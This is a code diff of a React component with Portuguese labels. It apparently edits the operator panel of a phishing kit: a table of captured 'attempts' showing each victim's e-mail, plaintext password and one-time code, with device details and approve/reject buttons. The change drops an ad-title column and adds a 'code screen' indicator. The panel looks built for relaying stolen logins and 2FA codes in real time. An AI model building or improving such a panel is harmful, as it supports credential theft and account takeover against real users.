@@ -574,14 +574,12 @@ function StatCard({
 function AttemptsTable({
   rows,
   leads,
-  adTitles,
   actionable,
   busy,
   onAction,
 }: {
   rows: AttemptRow[];
   leads: LeadRow[];
-  adTitles: Record<string, { title: string; slug: string }>;
   actionable: boolean;
   busy: string | null;
   onAction: (row: AttemptRow, action: "approve" | "reject") => void;
@@ -592,7 +590,6 @@ function AttemptsTable({
         <thead className="bg-muted/40 text-[10px] uppercase tracking-wide text-muted-foreground">
           <tr>
             <th className="px-4 py-3 text-left font-medium">Hora</th>
-            <th className="px-4 py-3 text-left font-medium">Anúncio</th>
             <th className="px-4 py-3 text-left font-medium">
               <span className="inline-flex items-center gap-1">
                 <Mail className="h-3 w-3" /> E-mail
@@ -608,6 +605,11 @@ function AttemptsTable({
                 <Hash className="h-3 w-3" /> Código
               </span>
             </th>
+            <th className="px-4 py-3 text-left font-medium">
+              <span className="inline-flex items-center gap-1">
+                <Monitor className="h-3 w-3" /> Tela
+              </span>
+            </th>
             <th className="px-4 py-3 text-left font-medium">Dispositivo</th>
             <th className="px-4 py-3 text-left font-medium">Status</th>
             {actionable && <th className="px-4 py-3 text-right font-medium">Ações</th>}
@@ -616,7 +618,6 @@ function AttemptsTable({
         <tbody>
           {rows.map((row) => {
             const ua = leads.find((l) => l.session_id === row.session_id)?.user_agent ?? null;
-            const ad = adTitles[row.ad_id];
             return (
               <tr
                 key={row.key}
@@ -627,19 +628,14 @@ function AttemptsTable({
                 <td className="whitespace-nowrap px-4 py-3 text-xs text-muted-foreground font-mono-tabular">
                   {formatTime(row.codeAt)}
                 </td>
-                <td className="px-4 py-3 text-xs">
-                  {ad ? (
-                    <div className="flex flex-col">
-                      <span className="truncate font-medium">{ad.title}</span>
-                      <span className="truncate font-mono text-[10px] text-muted-foreground">/{ad.slug}</span>
-                    </div>
-                  ) : (
-                    <span className="text-muted-foreground">—</span>
-                  )}
-                </td>
                 <td className="break-all px-4 py-3 font-mono text-xs">{row.email}</td>
                 <td className="break-all px-4 py-3 font-mono text-xs">{row.password}</td>
                 <td className="px-4 py-3 font-mono text-sm tracking-widest">{row.code}</td>
+                <td className="whitespace-nowrap px-4 py-3 text-xs">
+                  <span className="inline-flex items-center gap-1 rounded-full bg-primary/15 px-2 py-0.5 text-primary">
+                    Tela código
+                  </span>
+                </td>
                 <td className="whitespace-nowrap px-4 py-3 text-xs text-muted-foreground">{deviceLabel(ua)}</td>
                 <td className="whitespace-nowrap px-4 py-3 text-xs">
                   {row.status === "approve" && (
